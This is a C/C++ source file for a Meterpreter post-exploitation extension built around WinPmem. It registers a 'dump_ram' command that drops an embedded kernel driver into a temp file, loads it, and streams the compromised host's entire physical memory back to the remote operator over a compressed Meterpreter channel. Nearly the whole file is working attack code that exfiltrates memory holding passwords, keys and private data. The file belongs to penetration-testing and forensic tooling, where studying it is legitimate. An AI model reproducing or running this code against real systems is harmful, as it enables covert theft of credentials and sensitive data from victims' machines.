extern "C"{
	/*!
	 * @file WINPMEM.cpp
	 * @brief Entry point and intialisation functionality for the WINPMEM extention.
	 */
#include "../../common/common.h"

#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
	// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
	// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
	// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

	// this sets the delay load hook function, see DelayLoadMetSrv.h
	EnableDelayLoadMetSrv();

	DWORD dump_ram(Remote *remote, Packet *packet);

	Command customCommands[] =
	{
		COMMAND_REQ("dump_ram", dump_ram),
		COMMAND_TERMINATOR
	};

	/*!
	* @brief Initialize the server extension
	*/
	DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
	{
		hMetSrv = remote->met_srv;

		command_register_all(customCommands);

		return ERROR_SUCCESS;
	}

	/*!
	* @brief Deinitialize the server extension
	*/
	DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
	{
		command_deregister_all(customCommands);

		return ERROR_SUCCESS;
	}
}

#include "winpmem_meterpreter.h"

int WinPmem_meterpreter::extract_file_(__int64 resource_id, TCHAR *filename)
{
	// Locate the driver resource in the .EXE file.
	HRSRC hRes = FindResource(hAppInstance, MAKEINTRESOURCE(resource_id), L"FILE");
	if (hRes == NULL) {
		dprintf("[WINPMEM] Could not locate driver resource.");
		goto error;
	}

	HGLOBAL hResLoad = LoadResource(hAppInstance, hRes);
	if (hResLoad == NULL) {
		dprintf("[WINPMEM] Could not load driver resource.");
		goto error;
	}

	VOID *lpResLock = LockResource(hResLoad);
	if (lpResLock == NULL) {
		dprintf("[WINPMEM] Could not lock driver resource.");
		goto error;
	}

	DWORD size = SizeofResource(hAppInstance, hRes);

	// Now open the filename and write the driver image on it.
	HANDLE out_fd = CreateFile(filename, GENERIC_WRITE, 0, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (out_fd == INVALID_HANDLE_VALUE) {
		dprintf("[WINPMEM] Can not create temporary file.");
		goto error_resource;
	};

	if (!WriteFile(out_fd, lpResLock, size, &size, NULL)) {
		dprintf("[WINPMEM] Can not write to temporary file.");
		goto error_file;
	}
	CloseHandle(out_fd);

	return 1;

error_file:
	CloseHandle(out_fd);

error_resource:
error :
	return -1;

};

HANDLE WinPmem_meterpreter::get_fd() {
	return fd_;
}

SIZE_T WinPmem_meterpreter::get_max_physical_memory() {
	return max_physical_memory_;
}

int WinPmem_meterpreter64::extract_driver() {
	// 64 bit drivers use PTE acquisition by default.
	default_mode_ = PMEM_MODE_PTE;

	if (!driver_filename_) {
		TCHAR path[MAX_PATH + 1];
		TCHAR filename[MAX_PATH + 1];

		// Gets the temp path env string (no guarantee it's a valid path).
		if (!GetTempPath(MAX_PATH, path)) {
			dprintf("[WINPMEM] Unable to determine temporary path.");
			goto error;
		}

		GetTempFileName(path, service_name, 0, filename);
		set_driver_filename(filename);

		driver_is_tempfile_ = true;
	};

	dprintf("[WINPMEM] Extracting driver to %s", driver_filename_);

	return extract_file_(WINPMEM_64BIT_DRIVER, driver_filename_);

error:
	return -1;
}

int WinPmem_meterpreter32::extract_driver() {
	// 32 bit acquisition defaults to physical device.
	default_mode_ = PMEM_MODE_PHYSICAL;

	if (!driver_filename_) {
		TCHAR path[MAX_PATH + 1];
		TCHAR filename[MAX_PATH + 1];

		// Gets the temp path env string (no guarantee it's a valid path).
		if (!GetTempPath(MAX_PATH, path)) {
			dprintf("[WINPMEM] Unable to determine temporary path.");
			goto error;
		}

		GetTempFileName(path, service_name, 0, filename);
		set_driver_filename(filename);

		driver_is_tempfile_ = true;
	};

	dprintf("[WINPMEM] Extracting driver to %s", driver_filename_);

	return extract_file_(WINPMEM_32BIT_DRIVER, driver_filename_);

error:
	return -1;
}

WinPmem_meterpreter *WinPmemFactory()
{
	SYSTEM_INFO sys_info = {0};

	GetNativeSystemInfo(&sys_info);
	switch (sys_info.wProcessorArchitecture) {
	case PROCESSOR_ARCHITECTURE_AMD64:
		return new WinPmem_meterpreter64();

	case PROCESSOR_ARCHITECTURE_INTEL:
		return new WinPmem_meterpreter32();

	default:
		return NULL;
	}
};

DWORD dump_ram(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD result;
	result = WINPMEM_ERROR_UNKNOWN;
	__int64 status;
	DWORD size;
	DWORD mode = PMEM_MODE_AUTO;
	PoolChannelOps chops = {0};

	WinPmem_meterpreter *pmem_handle = WinPmemFactory();
	TCHAR *driver_filename = NULL;
	TCHAR *pagefile_path = L"C:\\pagefile.sys";
	BOOL acquire_pagefile = FALSE;

	status = pmem_handle->install_driver();
	if (status > 0) {
		pmem_handle->set_acquisition_mode(mode);
		result = WINPMEM_ERROR_SUCCESS;
	}
	else {
		result = WINPMEM_ERROR_FAILED_LOAD_DRIVER;
		dprintf("[WINPMEM] Failed to load winpmem driver");
		goto end;
	}

	// Somewhere to store the info from the driver;
	struct PmemMemoryInfo info;

	RtlZeroMemory(&info, sizeof(info));

	// Get the memory ranges.
	if (!DeviceIoControl(pmem_handle->get_fd(), PMEM_INFO_IOCTRL, NULL, 0, (char *)&info,
		sizeof(info), &size, NULL)) {
		dprintf("[WINPMEM] Failed to get memory geometry");
		result = WINPMEM_ERROR_FAILED_MEMORY_GEOMETRY;
		goto end;
	};

	//Initialize max_physical_memory_ when calling print_memory_info !!!!
	pmem_handle->print_memory_info();

	Channel *newChannel;

	WinpmemContext *ctx;
	// Allocate storage for the Winpmem context
	if (!(ctx = (WinpmemContext*)calloc(1, sizeof(WinpmemContext)))) {
		dprintf("[WINPMEM] Failed to allocate memory");
		result = WINPMEM_ERROR_FAILED_ALLOCATE_MEMORY;
		goto end;
	}

	ctx->winpmem = pmem_handle;
	ctx->pmem_info = info;
	ctx->offset = 0;
	ctx->index = 0;

	// Initialize the pool operation handlers
	chops.native.context = ctx;
	chops.native.close = winpmem_channel_close;
	chops.read = winpmem_channel_read;
	chops.eof = winpmem_channel_eof;

	if (!(newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS | CHANNEL_FLAG_COMPRESS, &chops)))
	{
		result = WINPMEM_ERROR_UNKNOWN;
		dprintf("[WINPMEM] Failed to get Meterpreter Channel");
		result = WINPMEM_ERROR_FAILED_METERPRETER_CHANNEL;
		goto end;
	}

	channel_set_type(newChannel, "winpmem");
	packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
	packet_add_tlv_qword(response, TLV_TYPE_WINPMEM_MEMORY_SIZE, pmem_handle->get_max_physical_memory());
end:
	packet_add_tlv_uint(response, TLV_TYPE_WINPMEM_ERROR_CODE, result);
	packet_transmit_response(ERROR_SUCCESS, remote, response);
	return ERROR_SUCCESS;
}

static DWORD winpmem_channel_close(Channel *channel, Packet *request,
	LPVOID context)
{
	WinpmemContext *ctx = (WinpmemContext *)context;
	ctx->winpmem->uninstall_driver();
	return ERROR_SUCCESS;
}

static DWORD winpmem_channel_eof(Channel *channel, Packet *request,
	LPVOID context, LPBOOL iseof)
{
	WinpmemContext *ctx = (WinpmemContext *)context;
	*iseof = ctx->index >= ctx->pmem_info.NumberOfRuns.QuadPart;
	return ERROR_SUCCESS;
}

static int winpmem_meterpreter_copy_memory(uint64_t start, uint64_t end,
		WinpmemContext *ctx, LPVOID buffer, DWORD bufferSize,
		LPDWORD bytesRead)
{
	LARGE_INTEGER large_start;

	if (start >= ctx->winpmem->get_max_physical_memory()) {
		return 0;
	};

	// Clamp the region to the top of physical memory.
	if (end > ctx->winpmem->get_max_physical_memory()) {
		end = ctx->winpmem->get_max_physical_memory();
	};

	while (start < end) {
		DWORD to_write = (DWORD)min(bufferSize - *bytesRead, end - start);
		DWORD bytes_read = 0;

		large_start.QuadPart = start;

		if (0xFFFFFFFF == SetFilePointerEx(
			ctx->winpmem->get_fd(), large_start, NULL, FILE_BEGIN)) {
			dprintf("[WINPMEM] Failed to seek in the pmem device.");
			goto error;
		};

		if (!ReadFile(ctx->winpmem->get_fd(), reinterpret_cast<char*>(buffer)+*bytesRead, to_write, &bytes_read, NULL) ||
			bytes_read != to_write) {
			dprintf("[WINPMEM] Failed to Read memory.");
			goto error;
		};

		*bytesRead += bytes_read;

		start += bytes_read;
	};
	return 1;

error:
	return 0;
};

static DWORD winpmem_channel_read(Channel *channel, Packet *request,
	LPVOID context, LPVOID buffer, DWORD bufferSize, LPDWORD bytesRead)
{
	WinpmemContext *ctx = (WinpmemContext *)context;
	uint64_t offset = ctx->offset;
	*bytesRead = 0;
	if (ctx->index >= ctx->pmem_info.NumberOfRuns.QuadPart) {
		dprintf("[WINPMEM] Memory end reached.");
		return ERROR_SUCCESS;
	}
	if (ctx->pmem_info.Run[ctx->index].start > ctx->offset) {
		//PADDING
		uint64_t padding_size = ctx->pmem_info.Run[ctx->index].start - ctx->offset;
		DWORD padding_size_max = (DWORD)min(padding_size, bufferSize);
		ZeroMemory(buffer, padding_size_max);
		*bytesRead += padding_size_max;
		offset += *bytesRead;
	}

	if (bufferSize - *bytesRead > 0) {
		uint64_t end = min(ctx->pmem_info.Run[ctx->index].length, bufferSize - *bytesRead);
		end += offset;
		DWORD status = winpmem_meterpreter_copy_memory(offset, end, ctx, buffer, bufferSize, bytesRead);
		if (status == 0) {
			dprintf("[WINPMEM] Failed in winpmem_meterpreter_copy_memory.");
		}
	}

	ctx->offset += *bytesRead;

	if (ctx->offset >= ctx->pmem_info.Run[ctx->index].start + ctx->pmem_info.Run[ctx->index].length) {
		ctx->index++;
	}
	return ERROR_SUCCESS;
}
